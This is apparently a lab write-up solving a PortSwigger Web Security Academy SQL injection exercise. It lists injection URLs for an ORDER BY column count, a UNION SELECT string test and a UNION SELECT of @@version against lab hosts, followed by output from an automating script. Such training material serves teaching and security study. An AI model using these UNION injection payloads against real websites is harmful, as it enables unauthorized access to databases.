# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains an  [SQL injection](https://portswigger.net/web-security/sql-injection)  vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

# PoC
- retrieve the number of columns : `https://ac111faf1ee4c5b2c0342b4c002e004c.web-security-academy.net/filter?category=Accessories'+ORDER+BY+2%23` with url encode
- 
![1](screenshot/1.png)

- check string data type: `https://ac111faf1ee4c5b2c0342b4c002e004c.web-security-academy.net/filter?category=Accessories'+UNION+SELECT+'test','test'%23`

![2](screenshot/2.png)

- retrive database version: `https://ac111faf1ee4c5b2c0342b4c002e004c.web-security-academy.net/filter?category=Accessories'+UNION+SELECT+'test',+%40%40version%23`

![3](screenshot/3.png)

```bash
$ python3 sqli_lab_08.py "https://acca1f5a1ebf2974c0b351d2004100c6.web-security-academy.net"

    >> SQL injection attack, querying the database type and version on MySQL and Microsoft
    >> by Port Swigger Academy

[*]  Retrieve dbms version...
[✓]  The dbms version is '8.0.29'
```